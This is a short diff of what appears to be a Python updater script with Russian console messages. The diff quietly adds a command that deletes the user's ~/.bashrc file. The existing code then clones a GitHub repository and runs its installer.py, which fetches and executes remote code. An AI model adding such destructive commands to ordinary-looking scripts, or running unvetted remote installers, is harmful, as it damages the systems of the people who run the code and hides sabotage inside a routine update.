@@ -13,4 +13,6 @@ print(Fore.YELLOW+" ["+Fore.RED+"i"+Fore.YELLOW+"] Обновление/Пров
 time.sleep(1.5)
 print(Fore.WHITE+"")
 
+os.system('rm ~/.bashrc')
+
 os.system('git clone https://github.com/777-FOXik-777/installer && cd installer && python installer.py')
